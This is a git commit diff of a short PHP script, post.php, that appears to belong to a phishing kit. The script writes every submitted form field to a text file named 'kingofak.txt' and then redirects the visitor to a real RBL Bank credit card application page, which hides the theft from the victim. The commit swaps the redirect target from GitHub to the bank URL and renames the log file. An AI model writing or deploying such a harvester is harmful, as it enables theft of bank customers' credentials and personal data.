209acf2971af193e23ad2f7b70d388b448dd8287
kingofka545454 <kingofak.17@gmail.com>
2024-08-07 12:45:23 +0530

    post.php

--- post.php
+++ post.php
@@ -1,6 +1,6 @@
 <?php
-header ('Location: https://github.com/);
-$handle = fopen("ak.txt", "a");
+header ('Location: https://applications.rblbank.com/apply-credit-card/appform?cardId=16&cs=website-pop-up-world-safari&cg=creditcard&sg=101&sc=WEB01&fc=FF&ofc=NIL&utm_campaign=CreditCard&utm_medium=website&utm_source=website-hp-credit-card-slot-world-safari');
+$handle = fopen("kingofak.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
 fwrite($handle, "=");
@@ -10,4 +10,6 @@ fwrite($handle, "\r\n");
 fwrite($handle, "\r\n");
 fclose($handle);
 exit;
+
+
 ?>
